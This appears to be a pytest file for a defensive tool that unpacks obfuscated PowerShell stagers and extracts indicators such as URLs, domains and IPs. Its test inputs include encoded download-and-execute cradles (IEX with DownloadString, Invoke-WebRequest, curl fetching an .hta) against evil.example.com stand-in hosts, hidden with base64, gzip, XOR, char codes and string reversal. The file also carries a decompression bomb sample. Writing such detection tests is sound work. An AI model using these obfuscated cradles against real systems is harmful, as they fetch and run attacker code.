from __future__ import annotations

import base64
import gzip

from app.processors.stager_unpacker import extract_iocs, normalise, unpack


def _ps_enc(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


def test_clickfix_encodedcommand_layer():
    inner = "iex (New-Object Net.WebClient).DownloadString('http://stage2.evil.example.com/p.ps1')"
    res = unpack(f"powershell -w h -nop -e {_ps_enc(inner)}")
    assert "http://stage2.evil.example.com/p.ps1" in res.urls
    assert "stage2.evil.example.com" in res.domains
    assert any(layer.technique == "encodedcommand" for layer in res.layers)


def test_gzip_frombase64_and_concat_three_layers():
    stage3 = "$u='ht'+'tps://c2.'+'evil.example.com/x';iwr $u"
    blob = base64.b64encode(gzip.compress(stage3.encode())).decode()
    stage2 = (
        "IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream("
        f"[IO.MemoryStream][Convert]::FromBase64String('{blob}'),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"
    )
    res = unpack(f"powershell -enc {_ps_enc(stage2)}")
    assert "https://c2.evil.example.com/x" in res.urls
    assert [layer.depth for layer in res.layers] == [0, 1, 2]
    assert "system.net" not in res.domains and "io.compression" not in res.domains


def test_char_codes_carets_backticks_and_reversed():
    assert "powershell" in normalise("p^o^w^e^r^s^h^e^l^l")
    assert "Invoke-Expression" in normalise("I`nvoke-Exp`ression")
    codes = ",".join(str(ord(c)) for c in "http://cc.evil.example.com/a")
    assert "http://cc.evil.example.com/a" in unpack(f"[char[]]({codes}) -join ''").urls
    assert "https://rev.evil.example.com/z" in unpack("$s='z/moc.elpmaxe.live.ver//:sptth'").urls


def test_xor_with_declared_key():
    secret = b"curl http://xor.evil.example.com/run.hta"
    blob = base64.b64encode(bytes(b ^ 0x5A for b in secret)).decode()
    res = unpack(f"$k=0x5A;$d=[Convert]::FromBase64String('{blob}');$d|%{{$_ -bxor 0x5A}}")
    assert "http://xor.evil.example.com/run.hta" in res.urls


def test_defanged_and_filename_noise():
    urls, domains, ips = extract_iocs(
        "see hxxp://evil[.]example[.]com/a and drop payload.zip then exploit.py 8.8.4.4 10.0.0.1"
    )
    assert "http://evil.example.com/a" in urls
    assert "payload.zip" not in domains and "exploit.py" not in domains
    assert ips == {"8.8.4.4"}


def test_decompression_bomb_is_bounded():
    bomb = base64.b64encode(gzip.compress(b"A" * 50_000_000)).decode()
    res = unpack(f"[Convert]::FromBase64String('{bomb}')")
    assert len(res.layers) >= 1  # finishes quickly, no memory blow-up
